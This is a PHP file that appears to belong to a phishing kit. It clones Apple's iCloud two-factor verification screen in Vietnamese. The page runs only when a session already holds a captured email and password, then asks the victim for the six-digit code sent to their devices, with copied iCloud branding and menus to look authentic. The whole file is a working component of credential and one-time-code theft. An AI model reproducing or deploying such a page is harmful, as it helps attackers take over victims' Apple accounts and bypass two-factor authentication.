<?php
session_start();

if (!isset($_SESSION['email']) || !isset($_SESSION['pass'])) {
    header("Location:index.php"); 
}

?>
<!DOCTYPE html>
<!-- saved from url=(0023)https://www.icloud.com/ -->
<html style="display: block;" lang="vi-vi">

<?php include "inc/header.php" ?>

<body class="sc-theme sc-focus box-shadow border-rad chrome windows webkit vi-vi" style="overflow: hidden;">
    <div id="sr-alert" role="alert" aria-labelledby="sr-alert-title" aria-describedby="sr-alert-description"></div>
    <div id="sc1193" class="atv4 sc-view sc-pane sc-main overflow-visible" style="left: 0px; right: 0px; top: 0px; bottom: 0px; z-index: 2; ">
        <div id="sc1194" class="atv4 sc-view" style="left: 0px; right: 0px; top: 0px; height: 0px; z-index: 101; "></div>
        <div id="sc1197" class="atv4 sc-view apps-container-view overflow-visible" style="left: -10000px; top: -10000px; z-index: 100; width: 1745px; height: 849px;"></div>
        <!-- Background -->
        <?php include "inc/background.php" ?>
        <!-- End background -->
        <div class="cw-drop-target-container"><input class="cw-drop-target-file" type="file" multiple="multiple"></div>
        <div id="sc1692" class="atv4 sc-view springboard-view" style="left: 0px; width: 1745px; top: 0px; height: 805px; min-width: 950px; min-height: 700px; z-index: 50; opacity: 1; transform: translateX(0px) translateY(0px) translateZ(0px);" aria-hidden="true">
           
            <div aria-disabled="true" id="sc1732" class="atv4 sc-view icloud-text-view disabled" style="left: 13px; width: 58px; top: 0px; height: 44px;"><span class="icloud-text"></span></div>
        </div>
    </div>
    <div id="sc1674" class="atv4 sc-view sc-pane login-pane" style="left: 0px; right: 0px; top: 0px; bottom: 0px; z-index: 5; opacity: 1;">
        <div id="sc1680" class="atv4 sc-view apple-auth-frame" style="margin-top: -250px; margin-left: -320px; left: 50%; width: 640px; top: 50%; height: 480px; z-index: 5; opacity: 1;">
            <div class="tk-body sf-ns-ui">
                <div class="si-body si-container container-fluid" id="content" data-theme="lite">
                    <apple-auth>
                        <div class="widget-container fade-in  restrict-max-wh  fade-in " data-mode="embed" data-isiebutnotedge="false">
                            <div id="step" class="si-step ">
                                <logo>
                                    <div class="logo signin-label  fade-in">
                                        <img class="cnsmr-app-image" src="images/icloud_drive_icon@2x.png" alt="Logo của ứng dụng" style="width: 100px;">
                                    </div>
                                </logo>
                                <div id="stepEl" class="">
                                    <hsa2>
                                        <div class="hsa2">
                                            <verify-device>
                                                <div class="verify-device fade-in ">
                                                    <div class="">
                                                        <h1 class="si-container-title tk-intro" tabindex="-1">
                                                            Xác Thực Hai Yếu Tố
                                                        </h1>
<div class="sec-code-wrapper">
    <security-code split="true" type="tel" sr-context="Nhập Mã Xác Minh" localised-digit="Số" error-message="">
        <div class="security-code">
            <idms-error-wrapper popover-auto-close="false">
                <div class="" id="idms-error-wrapper-1551981078626-0">
                    <div id="security-code-wrap-1551981078627-0" class="security-code-wrap security-code-6 split" localiseddigit="Số">
                        <div class="security-code-container force-ltr">
                            <div class="field-wrap force-ltr">
                                <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char0" class="form-control force-ltr form-textbox char-field"data-index="0">
                            </div>
                            <div class="field-wrap force-ltr">
                                <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char1" class="form-control force-ltr form-textbox char-field"data-index="1">
                            </div>
                            <div class="field-wrap force-ltr">
                                <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char2" class="form-control force-ltr form-textbox char-field"data-index="2">
                            </div>
                            <div class="field-wrap force-ltr">
                                <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char3" class="form-control force-ltr form-textbox char-field" data-index="3">
                            </div>
                            <div class="field-wrap force-ltr">
                                <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char4" class="form-control force-ltr form-textbox char-field" data-index="4">
                            </div>
                            <div class="field-wrap force-ltr">
                                <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char5" class="form-control force-ltr form-textbox char-field"data-index="5">
                            </div>
                        </div>
                    </div>
                </div>
            </idms-error-wrapper>
        </div>
    </security-code>
</div>
                                                        <div class="si-info">
                                                            <p>
                                                                Đã gửi tin nhắn với mã xác minh đến các thiết bị của bạn. Nhập mã để tiếp tục.
                                                            </p>
                                                        </div>
                                                        <a class="si-link ax-outline tk-subbody lite-theme-override" id="no-trstd-device-pop" href="#" aria-haspopup="true">
                                                            Bạn không nhận được mã xác minh?
                                                        </a>
                                                        <div class="spinner-container verifying-code" id="verifying-code">
                                                            
    <div class="verifying-code-text thin"></div>

                                                        </div>
                                                    </div>
                                                </div>
                                            </verify-device>
                                        </div>
                                    </hsa2>
                                </div>
                            </div>
                        </div>
                    </apple-auth>
                </div>
                <input type="hidden" id="fdcBrowserData" value="">
            </div>
        </div>
        <div id="sc1676" class="atv4 sc-view sc-container-view" style="left: 0px; right: 0px; top: 0px; bottom: 0px; z-index: -1">
            <div id="sc4667" class="atv4 sc-view" style="left: 0px; right: 0px; top: 0px; bottom: 0px; ">
                <div id="sc4668" class="atv4 icloud-controls sc-view account-menu cos-account-menu" style="right: 2px; width: 149.148px; top: 0px; height: 44px; z-index: 3;">
                    <div role="button" aria-label="iCloud Settings &amp; Sign Out" aria-haspopup="true" title="iCloud Settings &amp; Sign Out" alt="iCloud Settings &amp; Sign Out" aria-hidden="false" id="sc4676" class="atv4 icloud-controls borderless sc-view sc-button-view account-menu large-display-text button sc-huge-size" style="left: 0px; right: 55px; top: -5px; bottom: 0px;"><label id="sc4741-label" class="sc-button-label sc-huge-size ellipsis">User</label>
                        <div class="chevron"></div>
                    </div>
                    <div id="sc4683" class="atv4 icloud-controls sc-view account-menu-divider" style="margin-top: -11px; right: 44px; width: 1px; top: 50%; height: 22px; "></div>
                    <div role="button" title="Giúp Đỡ và Hỗ Trợ" alt="Giúp Đỡ và Hỗ Trợ" aria-hidden="false" id="sc4685" class="atv4 icloud-controls sc-view sc-button-view sc-image-button-view image-button sc-regular-size no-min-width" style="right: 0px; width: 44px; top: 0px; bottom: 0px; ">
                        <div class="img help-icon"></div>
                    </div>
                    <div id="sc4762" class="atv4 icloud-controls sc-view cw-photo-icon no-photo" style="right: 119.148px; width: 28px; top: 8px; height: 28px;">
                        <div class="photo-container"></div>
                    </div>
                    <div class="wrap-menuct" style="display: none;">
                        <div role="menu" tabindex="0" id="sc3026" class="menu atv4 sc-view sc-pane sc-panel sc-picker cw-menu focus sc-regular-size" style="width: 131.813px; top: 56px; height: 54px;">
                            <div class="_scpv_background cw-picker-background menu atv4 sc-regular-size calculated-pointer top-or-bottom-position">
                                <div class="sc-pointer sc-point-up" style="left: 66px;"></div>
                            </div>
                            <div id="sc3029" class="atv4 sc-view sc-scroll-view sc-menu-scroll-view" style="left: 0px; right: 0px; top: 0px; bottom: 0px; ">
                                <div class="corner"></div>
                                <div id="sc3030" class="atv4 sc-view sc-container-view" style="left: 0px; right: 0px; top: 0px; bottom: 0px; ">
                                    <div id="sc3039" class="atv4 sc-view" style="left: 0px; right: 0px; top: 0px; height: 54px; ">
                                        <div role="menuitem" tabindex="0" id="sc3104" class="atv4 sc-view sc-menu-item" style="left: 0px; right: 0px; top: 0px; height: 27px;"><a class="menu-item"><span class="value ellipsis">Cài đặt iCloud</span></a></div>
                                        <div role="menuitem" tabindex="0" id="sc3110" class="atv4 sc-view sc-menu-item" style="left: 0px; right: 0px; top: 27px; height: 27px;"><a class="menu-item"><span class="value ellipsis">Đăng Xuất</span></a></div>
                                    </div>
                                </div>
                                <div role="scrollbar" id="sc3032" class="atv4 sc-view sc-scroller-view sc-menu-scroller-view sc-hidden sc-vertical sc-regular-size" style="left: 0px; right: 0px; top: 0px; bottom: 0px;"><span class="scrollArrow arrowUp">&nbsp;</span></div>
                                <div role="scrollbar" id="sc3035" class="atv4 sc-view sc-scroller-view sc-menu-scroller-view sc-hidden sc-vertical sc-regular-size" style="left: 0px; right: 0px; top: 0px; bottom: 0px;"><span class="scrollArrow arrowDown">&nbsp;</span></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="sc4693" class="atv4 sc-view footer" style="margin-left: -300px; left: 50%; width: 600px; top: 615.5px; height: 160px; z-index: 5;">
                    <div id="sc4700" class="atv4 sc-view quick-access-section" style="left: 0px; right: 0px; top: 0px; bottom: 0px; min-width: 515px; min-height: 124px;">
                        <div id="sc4702" class="atv4 sc-view sc-label-view title label sc-large-size" style="left: 100px; top: 10px; height: 44.5455px; max-width: 400px; text-align: center; width: 400px;">Bạn cần tìm thiết bị của mình? Nhận quyền truy cập<br>nhanh vào:</div>
                        <div id="sc4704" class="atv4 sc-view" style="left: 85px; top: 57.5455px; height: 72px; max-width: 600px; width: 430px; min-width: 430px; min-height: 72px;">
                            <div role="button" tabindex="0" id="sc4706" class="atv4 borderless sc-view sc-button-view quick-access-button button sc-regular-size" style="left: 0px; top: 0px; max-width: 150px; width: 150px; height: 72px; min-height: 0px;">
                                <div class="display-icon fmip" style="display:inline-block"></div>
                                <div class="display-text">Tìm iPhone</div>
                                <div id="sc4708" class="atv4 borderless sc-view hsa-spinner sc-hidden" style="left: 0px; right: 0px; top: 45px; height: 22px; max-width: 150px;">
                                    <div class="container">
                                        <div class="icon-container">
                                            <div class="spinner spinner"></div>
                                        </div>
                                        <div style="max-width:124px;" class="text">Đang tải…</div>
                                    </div>
                                </div>
                            </div>
                            <div role="button" tabindex="0" id="sc4712" class="atv4 borderless sc-view sc-button-view quick-access-button button sc-regular-size" style="left: 150px; top: 0px; max-width: 130px; width: 130px; height: 72px; min-height: 0px;">
                                <div class="display-icon apple-pay" style="display:inline-block"></div>
                                <div class="display-text">Apple Pay</div>
                                <div id="sc4714" class="atv4 borderless sc-view hsa-spinner sc-hidden" style="left: 0px; right: 0px; top: 45px; height: 22px; max-width: 130px;">
                                    <div class="container">
                                        <div class="icon-container">
                                            <div class="spinner spinner"></div>
                                        </div>
                                        <div style="max-width:104px;" class="text">Đang tải…</div>
                                    </div>
                                </div>
                            </div>
                            <div role="button" tabindex="0" id="sc4718" class="atv4 borderless sc-view sc-button-view quick-access-button button sc-regular-size" style="left: 280px; top: 0px; max-width: 150px; width: 150px; height: 72px; min-height: 0px;">
                                <div class="display-icon apple-watch" style="display:inline-block"></div>
                                <div class="display-text">Cài đặt Apple Watch</div>
                                <div id="sc4720" class="atv4 borderless sc-view hsa-spinner sc-hidden" style="left: 0px; right: 0px; top: 45px; height: 22px; max-width: 150px;">
                                    <div class="container">
                                        <div class="icon-container">
                                            <div class="spinner spinner"></div>
                                        </div>
                                        <div style="max-width:124px;" class="text">Đang tải…</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="sc4727" class="atv4 sc-view cloudos-mini-links cancel-link sc-hidden" style="left: 50%; width: 0px; top: 754.5px; height: 25px; z-index: 6;">
                    <div><a aria-hidden="true" target="blank">&lt; Trở lại</a></div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>